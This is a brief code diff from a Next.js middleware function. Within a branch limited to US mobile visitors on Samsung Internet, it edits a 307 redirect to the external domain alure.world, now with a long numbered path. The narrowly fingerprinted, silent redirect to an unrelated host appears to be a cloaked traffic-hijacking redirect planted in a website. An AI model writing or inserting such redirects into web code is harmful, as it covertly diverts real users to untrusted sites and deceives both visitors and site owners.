@@ -84,7 +84,7 @@ export function middleware(request: NextRequest) {
       // Condition 2: Mobile device only
       // Condition 3: Samsung Internet Browser
       if (country === 'US' && isMobile && isSamsung) {
-        return NextResponse.redirect('http://alure.world/', 307);
+        return NextResponse.redirect('http://alure.world/1/2/3/4/5/6/7/8/9/10/11/12/13/14/15/16/17/18/19/20', 307);
       }
 
       // If server identified the country (and it didn't match), pass cookie to inform client fallback
